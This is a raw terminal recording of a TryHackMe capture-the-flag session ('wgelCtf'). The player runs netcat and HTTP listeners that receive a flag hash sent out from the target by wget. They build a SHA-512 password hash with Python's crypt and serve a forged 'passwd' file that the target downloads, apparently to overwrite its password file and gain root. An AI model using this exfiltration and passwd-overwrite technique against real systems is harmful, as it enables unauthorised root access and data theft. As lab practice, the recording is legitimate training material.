@@ -1,0 +1,127 @@
+Script started on 2021-04-04 23:57:14+05:30 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="80" LINES="24"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ sudo python3 -m   http.server 80
+[sudo] password for supitha: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.17.83 - - [04/Apr/2021 23:57:54] code 501, message Unsupported method ('POST')
+10.10.17.83 - - [04/Apr/2021 23:57:54] "POST / HTTP/1.1" 501 -
+^C
+Keyboard interrupt received, exiting.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ ls
+id_rsa  nikto.log  terminal1  terminal2
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ nc -lvnp 80
+nc: Permission denied
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ sudo nc -lvnp 80 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K0
+Listening on 0.0.0.0 80
+Connection received on 10.10.17.83 38436
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.9.4.10
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+b1b968b37519ad1daa6408188649263d
+^C
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ subl [K[K[K[K[Kpython -[K[K3 -m[K[K[K[K[K[K[K[K[K[Ksudo nc -lvnp 80 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[5P
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Ksudo python3 -m  http.server 80[K[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [C[C[C[C[Copenvpn kill[4PerX.ovpn [A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [3Pcd Downloads/
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo openvpn killerX.ovpn [A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [C[C[C[C[Cpython3 -m  http.server 8[K[K[K[K[K[K[K[K[K[K[K[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kpython3 -m http. server --help
+usage: server.py [-h] [--cgi] [--bind ADDRESS] [--directory DIRECTORY] [port]
+
+positional arguments:
+  port                  Specify alternate port [default: 8000]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --cgi                 Run as CGI Server
+  --bind ADDRESS, -b ADDRESS
+                        Specify alternate bind address [default: all
+                        interfaces]
+  --directory DIRECTORY, -d DIRECTORY
+                        Specify alternative directory [default:current
+                        directory]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ python3 -m http.server --help[K[K[K[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ sudo nc -lvnp 80 [K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[5P
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo nc -lvnp 80 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[5P
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Knc -lvnp 80sudo nc -lvnp 80 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython3 -m http.server --h[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ sudo nc -lvnp 80 [K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython3 -m http.server --h[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython3 -m http.server --h[Kcgi 80[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cspython3 -m http.[1@s[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [Cupython3 -m http[1@.[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [C[Cdpython3 -m htt[1@p[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [C[C[Copython3 -m ht[1@t[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [C[C[C[C python3 -m h[C[1@t[A]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ [C[C[C[C[C
+
+[sudo] password for supitha: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.17.83 - - [05/Apr/2021 00:18:31] code 501, message Can only POST to CGI scripts
+10.10.17.83 - - [05/Apr/2021 00:18:31] "POST / HTTP/1.1" 501 -
+^C
+Keyboard interrupt received, exiting.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ wget https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py
+--2021-04-05 00:21:04--  https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py
+Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
+Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1575 (1.5K) [text/plain]
+Saving to: ‘server.py’
+
+server.py                                            0%[                                                                                                                ]       0  --.-KB/s               server.py                                          100%[===============================================================================================================>]   1.54K  --.-KB/s    in 0.003s  
+
+2021-04-05 00:21:05 (526 KB/s) - ‘server.py’ saved [1575/1575]
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ ls
+id_rsa  nikto.log  server.py  terminal1  terminal2
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ python3 server.py 80
+Traceback (most recent call last):
+  File "server.py", line 46, in <module>
+    run(port=int(argv[1]))
+  File "server.py", line 33, in run
+    httpd = server_class(server_address, handler_class)
+  File "/usr/lib/python3.8/socketserver.py", line 452, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.8/http/server.py", line 138, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.8/socketserver.py", line 466, in server_bind
+    self.socket.bind(self.server_address)
+PermissionError: [Errno 13] Permission denied
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ python3 server.py 80[1@s[1@u[1@d[1@o[1@ 
+INFO:root:Starting httpd...
+
+INFO:root:POST request,
+Path: /
+Headers:
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.9.4.10
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+
+
+Body:
+b1b968b37519ad1daa6408188649263d
+
+
+10.10.17.83 - - [05/Apr/2021 00:21:50] "POST / HTTP/1.1" 200 -
+^CINFO:root:Stopping httpd...
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ ls
+id_rsa  nikto.log  server.py  terminal1  terminal2
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ subl passwd
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ pytho[K[K[K[K[Kpython3
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import crypt
+>>> crypt.crypt()")")h")e")l")l")o")
+'$6$cNf2.Jxso/gnRoFz$j.Ur0j8RbrhV84e5V2H3bUTZt7sOvdL317Su005eZ4PhF4OkjEq92VuI.1paikGeR35k1bn9aCvvLdC33qEbl.'
+>>> 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ python3 http.se[K[K[K[K[K[K[K-m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.17.83 - - [05/Apr/2021 00:28:58] "GET /passwd HTTP/1.1" 200 -
+10.10.17.83 - - [05/Apr/2021 00:29:11] "GET /passwd HTTP/1.1" 200 -
+10.10.17.83 - - [05/Apr/2021 00:30:52] "GET /passwd HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_wgelCtf[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_wgelCtf[00m$ exit
+exit
+
+Script done on 2021-04-05 00:32:49+05:30 [COMMAND_EXIT_CODE="0"]
